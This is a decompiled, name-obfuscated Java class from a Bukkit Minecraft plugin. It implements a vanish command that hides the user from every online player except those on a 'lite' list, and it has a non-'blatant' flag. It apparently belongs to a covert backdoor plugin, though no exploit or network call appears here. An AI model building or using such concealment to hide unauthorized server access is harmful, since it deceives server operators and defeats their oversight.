/*
 * Decompiled with CFR 0.150.
 * 
 * Could not load the following classes:
 *  org.bukkit.Bukkit
 *  org.bukkit.entity.Player
 */
package me.system.runner.command.impl;

import me.system.runner.Core;
import me.system.runner.command.Command;
import me.system.runner.utils.Settings;
import org.bukkit.Bukkit;
import org.bukkit.entity.Player;

public class VanishCommand
extends Command {
    @Override
    public void execute(Core lllllllllllllIlIllIIIlIIIllIIlII, String lllllllllllllIlIllIIIlIIIllIIlll, String[] lllllllllllllIlIllIIIlIIIllIIllI, Player lllllllllllllIlIllIIIlIIIllIIIll) {
        if (lllllllllllllIlIllIIIlIIIllIIlII.vanish.contains((Object)lllllllllllllIlIllIIIlIIIllIIIll)) {
            for (Player lllllllllllllIlIllIIIlIIIllIlIll : Bukkit.getOnlinePlayers()) {
                if (lllllllllllllIlIllIIIlIIIllIIlII.lite.contains(lllllllllllllIlIllIIIlIIIllIlIll.getName())) continue;
                lllllllllllllIlIllIIIlIIIllIlIll.showPlayer(lllllllllllllIlIllIIIlIIIllIIIll);
            }
            lllllllllllllIlIllIIIlIIIllIIlII.vanish.remove((Object)lllllllllllllIlIllIIIlIIIllIIIll);
            lllllllllllllIlIllIIIlIIIllIIIll.sendMessage(Settings.PREFIX("You are now unvanished"));
        } else {
            for (Player lllllllllllllIlIllIIIlIIIllIlIlI : Bukkit.getOnlinePlayers()) {
                if (lllllllllllllIlIllIIIlIIIllIIlII.lite.contains(lllllllllllllIlIllIIIlIIIllIlIlI.getName())) continue;
                lllllllllllllIlIllIIIlIIIllIlIlI.hidePlayer(lllllllllllllIlIllIIIlIIIllIIIll);
            }
            lllllllllllllIlIllIIIlIIIllIIlII.vanish.add(lllllllllllllIlIllIIIlIIIllIIIll);
            lllllllllllllIlIllIIIlIIIllIIIll.sendMessage(Settings.PREFIX("You are now vanished"));
        }
    }

    public VanishCommand() {
        VanishCommand lllllllllllllIlIllIIIlIIIlllIIIl;
    }

    @Override
    public boolean isBlatant() {
        return false;
    }
}

